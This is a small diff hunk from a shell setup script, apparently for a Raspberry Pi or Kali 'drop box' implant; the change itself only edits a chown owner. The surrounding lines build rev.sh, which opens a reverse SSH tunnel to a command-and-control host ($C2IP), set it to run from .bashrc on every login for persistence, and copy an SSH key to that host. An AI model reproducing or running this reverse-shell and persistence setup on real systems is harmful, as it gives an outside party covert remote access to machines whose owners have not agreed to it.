@@ -40,7 +40,7 @@ touch rev.sh
 echo “#!/bin/bash” >> rev.sh
 echo "ssh -N -R 2222:localhost:22 root@$C2IP" >> rev.sh
 sudo chmod +x rev.sh
-chown pi:pi rev.sh
+chown kali:kali rev.sh
 echo "sleep 15 && bash /home/kali/rev.sh" >> /home/pi/.bashrc
 ssh-copy-id -i ~/.ssh/id_rsa.pub root@$C2IP
 echo "All Is Complete"
